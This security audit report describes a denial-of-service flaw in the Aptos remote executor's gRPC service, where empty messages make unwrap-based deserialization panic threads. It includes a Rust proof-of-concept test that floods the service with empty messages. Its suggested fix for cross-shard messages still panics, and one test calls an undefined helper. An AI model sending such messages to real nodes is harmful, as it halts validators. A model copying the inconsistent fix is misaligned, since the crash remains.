# Audit Report

## Title
Zero-Length Message Handling Causes Thread Panics in Remote Executor Service

## Summary
The `simple_msg_exchange()` function in the gRPC network service accepts messages without validating that the message data is non-empty. Critical execution handlers perform unsafe BCS deserialization with `.unwrap()`, causing thread panics when processing empty messages. An unauthenticated attacker can exploit this to exhaust thread pools and halt block execution in sharded execution environments.

## Finding Description

The gRPC service endpoint `simple_msg_exchange()` accepts incoming `NetworkMessage` requests and routes them to registered handlers based on the `message_type` field, without validating that the `message` bytes are non-empty. [1](#0-0) 

The protobuf definition allows empty bytes for the `message` field: [2](#0-1) 

There is no authentication or authorization on this gRPC service, allowing any network peer to send messages.

Two critical handlers perform unsafe deserialization that panics on empty messages:

**1. RemoteStateViewService Handler** - processes `"remote_kv_request"` messages: [3](#0-2) 

The handler attempts to deserialize the message into a `RemoteKVRequest` struct with required fields: [4](#0-3) 

**2. RemoteCrossShardClient Handler** - processes `"cross_shard_{0-3}"` messages: [5](#0-4) 

The handler attempts to deserialize into a `CrossShardMsg` enum: [6](#0-5) 

BCS deserialization of empty bytes into these complex types will always fail because BCS requires at least one byte for enum variants and struct field data. The `.unwrap()` calls cause thread panics.

**Attack Path:**
1. Attacker sends gRPC `SimpleMsgExchange` request with `message_type = "remote_kv_request"` and `message = []` (empty bytes)
2. The `simple_msg_exchange()` function wraps empty bytes in a `Message` and routes to the state view service handler
3. The handler spawns a thread pool task that calls `bcs::from_bytes(&message.data).unwrap()`
4. BCS deserialization fails on empty bytes
5. `.unwrap()` panics the thread pool worker thread

The state view service uses a rayon thread pool: [7](#0-6) 

The cross-shard client is used by the executor service: [8](#0-7) 

## Impact Explanation

**HIGH Severity** per Aptos Bug Bounty criteria:

1. **Validator Node Slowdowns**: Repeated attacks on `"remote_kv_request"` exhaust the rayon thread pool by panicking worker threads. This degrades or halts state query processing, impacting validator operations.

2. **Block Execution Halt**: Attacks on `"cross_shard_{round}"` messages panic the executor thread when it attempts to receive cross-shard messages. This completely halts sharded block execution, preventing validators from processing transactions and reaching consensus on new blocks.

This breaks the **Resource Limits** invariant (operations must respect computational limits) and compromises **validator availability**, a core security guarantee of the Aptos network.

## Likelihood Explanation

**High Likelihood:**

- **No Prerequisites**: Attack requires only network access to the gRPC service (bound to a SocketAddr) and a standard gRPC client
- **No Authentication**: The gRPC service has no authentication or authorization mechanisms
- **Trivial Exploitation**: Message types are predictable strings (`"remote_kv_request"`, `"cross_shard_0"`, etc.)
- **Immediate Impact**: Single empty message causes immediate thread panic
- **Repeatable**: Attacker can send unlimited empty messages to exhaust thread pools

## Recommendation

**1. Add Message Validation**

Validate message data is non-empty in `simple_msg_exchange()`:

```rust
async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    let _timer = NETWORK_HANDLER_TIMER
        .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
        .start_timer();
    let remote_addr = request.remote_addr();
    let network_message = request.into_inner();
    
    // Validate message is non-empty
    if network_message.message.is_empty() {
        error!(
            "Received empty message from {:?} with type {:?}",
            remote_addr, network_message.message_type
        );
        return Err(Status::invalid_argument("Message data cannot be empty"));
    }
    
    let msg = Message::new(network_message.message);
    let message_type = MessageType::new(network_message.message_type);
    // ... rest of function
}
```

**2. Replace `.unwrap()` with Error Handling**

In `RemoteStateViewService::handle_message()`:

```rust
let req: RemoteKVRequest = match bcs::from_bytes(&message.data) {
    Ok(r) => r,
    Err(e) => {
        error!("Failed to deserialize RemoteKVRequest: {:?}", e);
        return; // Don't panic the thread
    }
};
```

In `RemoteCrossShardClient::receive_cross_shard_msg()`:

```rust
let msg: CrossShardMsg = match bcs::from_bytes(&message.to_bytes()) {
    Ok(m) => m,
    Err(e) => {
        panic!("Fatal: Failed to deserialize CrossShardMsg: {:?}", e);
    }
};
```

**3. Add Authentication**

Implement TLS mutual authentication or token-based authentication for the gRPC service to prevent unauthorized message injection.

## Proof of Concept

```rust
#[cfg(test)]
mod exploit_test {
    use super::*;
    use aptos_protos::remote_executor::v1::{
        network_message_service_client::NetworkMessageServiceClient,
        NetworkMessage,
    };
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};
    
    #[tokio::test]
    async fn test_empty_message_causes_panic() {
        // Setup: Start a remote state view service
        let server_addr = SocketAddr::new(
            IpAddr::V4(Ipv4Addr::LOCALHOST), 
            50051
        );
        
        // Attacker: Connect to the service
        let channel = tonic::transport::Channel::from_static("http://localhost:50051")
            .connect()
            .await
            .unwrap();
        let mut client = NetworkMessageServiceClient::new(channel);
        
        // Exploit: Send empty message with remote_kv_request type
        let attack_message = NetworkMessage {
            message: vec![],  // Empty bytes - will cause panic
            message_type: "remote_kv_request".to_string(),
        };
        
        let request = tonic::Request::new(attack_message);
        
        // This will succeed at the network level but cause a thread panic
        // in the handler when it tries to deserialize
        let response = client.simple_msg_exchange(request).await;
        assert!(response.is_ok());
        
        // The thread pool worker thread has now panicked
        // Repeated attacks exhaust the thread pool
        for _ in 0..10 {
            let attack = NetworkMessage {
                message: vec![],
                message_type: "remote_kv_request".to_string(),
            };
            client.simple_msg_exchange(tonic::Request::new(attack))
                .await
                .unwrap();
        }
        
        // Thread pool is now degraded/exhausted
    }
    
    #[tokio::test]
    async fn test_cross_shard_empty_message_halts_execution() {
        let mut client = get_grpc_client().await;
        
        // Send empty message for cross-shard communication
        let attack = NetworkMessage {
            message: vec![],  // Empty - will panic executor thread
            message_type: "cross_shard_0".to_string(),
        };
        
        client.simple_msg_exchange(tonic::Request::new(attack))
            .await
            .unwrap();
        
        // When executor calls receive_cross_shard_msg(0), it will panic
        // halting block execution
    }
}
```

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** protos/proto/aptos/remote_executor/v1/network_msg.proto (L8-11)
```text
message NetworkMessage {
  bytes message = 1;
  string message_type = 2;
}
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L30-36)
```rust
        let num_threads = num_threads.unwrap_or_else(num_cpus::get);
        let thread_pool = Arc::new(
            rayon::ThreadPoolBuilder::new()
                .num_threads(num_threads)
                .build()
                .unwrap(),
        );
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L74-87)
```rust
    pub fn handle_message(
        message: Message,
        state_view: Arc<RwLock<Option<Arc<S>>>>,
        kv_tx: Arc<Vec<Sender<Message>>>,
    ) {
        // we don't know the shard id until we deserialize the message, so lets default it to 0
        let _timer = REMOTE_EXECUTOR_TIMER
            .with_label_values(&["0", "kv_requests"])
            .start_timer();
        let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
            .with_label_values(&["0", "kv_req_deser"])
            .start_timer();
        let req: RemoteKVRequest = bcs::from_bytes(&message.data).unwrap();
        drop(bcs_deser_timer);
```

**File:** execution/executor-service/src/lib.rs (L68-71)
```rust
pub struct RemoteKVRequest {
    pub(crate) shard_id: ShardId,
    pub(crate) keys: Vec<StateKey>,
}
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L61-66)
```rust
    fn receive_cross_shard_msg(&self, current_round: RoundId) -> CrossShardMsg {
        let rx = self.message_rxs[current_round].lock().unwrap();
        let message = rx.recv().unwrap();
        let msg: CrossShardMsg = bcs::from_bytes(&message.to_bytes()).unwrap();
        msg
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/messages.rs (L8-11)
```rust
pub enum CrossShardMsg {
    RemoteTxnWriteMsg(RemoteTxnWrite),
    StopMsg,
}
```

**File:** execution/executor-service/src/remote_executor_service.rs (L37-40)
```rust
        let cross_shard_client = Arc::new(RemoteCrossShardClient::new(
            &mut controller,
            remote_shard_addresses,
        ));
```
